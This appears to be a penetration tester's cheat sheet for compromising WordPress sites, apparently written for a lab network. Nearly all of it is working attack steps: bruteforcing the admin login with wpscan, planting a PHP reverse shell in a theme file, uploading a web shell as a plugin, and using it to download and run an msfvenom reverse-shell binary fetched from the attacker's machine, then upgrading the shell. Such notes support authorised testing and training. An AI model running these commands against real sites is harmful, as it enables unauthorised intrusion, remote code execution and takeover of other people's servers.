#### WordPress

1. Try to bruteforce the login of any WP sites

   ```bash
   wpscan --url http://10.11.1.234/wp --passwords /usr/share/wordlists/rockyou-top100.txt --usernames admin
   ```

2. Themes

   1. From the admin console, you can get a reverse-shell using themes.  Go to Appearance-> Editor and insert PentestMonkey's Reverse PHP script `/home/coyote/opt/payloads/php-reverse-shell/php-reverse-shell.php` into the 'Archives' page of the current theme.  Remember to change the IP and port.  
      Start a reverse shell to catch it

      ```bash
      sudo go_nc.sh 8000
      ```

      Then visit the page after inserting  the code to activate the shell.

      ```bash
      http://10.11.1.251/wp/wp-content/themes/twentysixteen/archive.php
      ```

3. PHP Commands + MSFVenom Payload

   1. If you can't use the themes, try to upload the `/usr/share/seclists/Web-Shells/WordPress/plugin-shell.php` as a plugin to be able to run commands using php.  Be sure to zip it first.

   2. After uploading the file, test it with some commands (remember commands must be in URL friendly format):

      ```bash
      curl http://10.11.1.251/wp/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=id
      ```

   3. Create a reverse shell payload with msfvenom and host it on Kali, then use the PHP script to get the file on the target.

      ```bash
      msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.216 LPORT=8000 -f elf -o lin_revhttp_8000.elf
      ```

      ```bash
      sudo go_pyhttp.sh
      ```

      ```bash
      curl http://10.11.1.251/wp/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://192.168.119.216/lin_revhttp_8000.elf
      ```

   4. Setup a nc listener, then use the php script to chmod the executable and execute it.

      ```bash
      sudo go_nc 8000
      ```

      ```bash
      curl http://10.11.1.251/wp/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2Bx%20lin_revhttp_8000.elf
      ```

      ```bash
      curl http://10.11.1.251/wp/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./lin_revhttp_8000.elf
      ```

   5. Upgrade your shell

      ```bash
      # If Python is available
      python -c 'import pty; pty.spawn("/bin/bash")'
      
      # Otherwise
      SHELL=/bin/bash script -q /dev/null
      # If the shell is still janky, do the following:
      CTRL+Z
      stty raw -echo
      #After typing the above, you won't see the next thing you type
      fg
      reset
      xterm
      #Press 'ENTER' a couple of times to get the prompt back
      ```

